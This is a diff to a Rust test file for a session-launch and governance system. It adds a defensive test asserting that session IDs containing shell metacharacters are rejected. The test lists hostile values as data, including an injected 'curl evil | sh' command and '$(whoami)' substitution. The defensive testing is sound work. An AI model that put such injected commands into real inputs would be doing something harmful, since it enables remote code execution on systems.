@@ -15,8 +15,8 @@ use std::time::{Duration, Instant};
 
 use wicked_apps_core::{open_store, ConformanceClaim, Decision};
 use wicked_core::{
-    decisions_path_for, Core, EntityMode, HumanConfirm, LaunchSpec, SessionStatus, StepInput,
-    StepOutput, StepRunner, StepStatus,
+    decisions_path_for, gov_run_dir, Core, EntityMode, HumanConfirm, LaunchSpec, SessionStatus,
+    StepInput, StepOutput, StepRunner, StepStatus,
 };
 use wicked_council::types::{Category, Confidence, Dispatcher, InputMode, Vote};
 use wicked_council::{AgenticCli, CouncilTask};
@@ -161,7 +161,7 @@ impl StepRunner for HookDenyRunner {
             evaluator_identity: "wicked-governance".into(),
             evaluated_at: 1_750_000_000,
         };
-        let path = decisions_path_for(&i.run_id);
+        let path = decisions_path_for(&i.run_id, i.attempt);
         if let Some(p) = path.parent() {
             let _ = std::fs::create_dir_all(p);
         }
@@ -239,8 +239,8 @@ fn wait_terminal(core: &Core, run_id: &str) -> Option<SessionStatus> {
 fn a_denied_tool_call_fails_the_session() {
     let dir = scratch("keystone");
     let db = dir.join("estate.db");
-    // Clean any stale decisions log for this run id so the fold starts empty.
-    let _ = std::fs::remove_file(decisions_path_for("gov-fail"));
+    // Clean any stale governance dir for this run id (launch_run_inner also clears it on a fresh launch).
+    let _ = std::fs::remove_dir_all(gov_run_dir("gov-fail"));
 
     let core = Core::spawn_with_engine(
         db.to_str().unwrap().to_string(),
@@ -265,5 +265,40 @@ fn a_denied_tool_call_fails_the_session() {
         "a governance-denied tool-call drives the SESSION to Failed (not a silent Completed): {status:?}"
     );
     let _ = std::fs::remove_dir_all(&dir);
-    let _ = std::fs::remove_file(decisions_path_for("gov-fail"));
+    let _ = std::fs::remove_dir_all(gov_run_dir("gov-fail"));
+}
+
+#[test]
+fn a_shell_hostile_session_id_is_rejected_at_launch() {
+    // Defense-in-depth: even though scope/phase now ride env (not the shell hook command), a session id
+    // carrying shell metacharacters is rejected at ingress — it is never a legitimate run id.
+    let dir = scratch("hostile");
+    let db = dir.join("estate.db");
+    let core = Core::spawn_with_engine(
+        db.to_str().unwrap().to_string(),
+        Arc::new(FixedDispatcher),
+        Arc::new(HookDenyRunner),
+    );
+    for hostile in [
+        "x\" ; curl evil | sh ; \"",
+        "$(whoami)",
+        "a`id`b",
+        "a;b",
+        "a|b",
+    ] {
+        let res = core.launch_run(LaunchSpec {
+            problem: "Build the thing".into(),
+            clis: vec![cli("a")],
+            entity_mode: EntityMode::Isolated,
+            session_id: hostile.into(),
+            human_confirm: HumanConfirm::None,
+            repo_ref: None,
+            workflow: None,
+        });
+        assert!(
+            res.is_err(),
+            "a shell-hostile session id must be rejected at launch: {hostile:?} → {res:?}"
+        );
+    }
+    let _ = std::fs::remove_dir_all(&dir);
 }
